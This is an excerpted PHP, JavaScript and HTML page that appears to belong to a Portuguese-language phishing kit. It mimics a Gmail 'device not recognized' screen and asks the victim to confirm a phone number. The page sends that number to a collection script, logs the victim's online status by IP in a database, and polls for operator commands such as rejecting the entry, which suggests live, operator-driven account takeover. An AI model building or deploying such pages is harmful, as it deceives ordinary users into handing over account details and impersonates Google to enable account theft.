...
$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', status='Cliente online no telefone', statusremote='Cliente online no telefone' WHERE ip='$ip'");
...
$(document).ready(function(){     
  ...
  $.ajax({
    ...
    url: 'sendphone.php',//Definindo o arquivo onde serão buscados os dados
...
function status(json) {
         ...
         if(json.comando=="negargmailtelefone"){ 
            clearInterval(myVar);
            comandoerrordados();
...
#telefone { width:70%; padding:10px; font-size:14px; border:none; outline:none; border-radius: 10px; }
...
<div style="height:40px;">
  <div style="float:left; font-size:16px; width:100%; text-align: center;">
    <span data-i18n="email.gmail.phone.message">Este dispositivo não é reconhecido. Para sua segurança, o Gmail quer ter certeza de que é realmente você. Confirme o número com o final *********</span> <?= $celular ?>
  </div>
</div>
...
<input type="text" name="telefone" id="telefone" placeholder="Digite seu telefone" onClick="clicar()" size="1" data-i18n="[placeholder]email.gmail.phone.placeholder">
<input type="hidden" name="email" id="email" value="<?=$email?>">
</div>
<div id="errorsenha"></div>
<div style="margin-top:60px; height: 40px;">
<!-- <div style="float: left; padding: 8px 0 0 0; font-size: 14px;"><a target="_blank" href="https://accounts.google.com/signin/v2/usernamerecovery?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forgot password</a></div> -->
<div style="float: right; text-align: right;"><input type="submit" name="entrar" id="entrar" value="Sincronizar" data-i18n="[value]email.gmail.phone.button" /></div>
</div>
</div>
</div>
</form>
...
<input type="hidden" id="message" value="Invalid phone!" data-i18n="[value]email.gmail.phone.error">
</body>
</html>
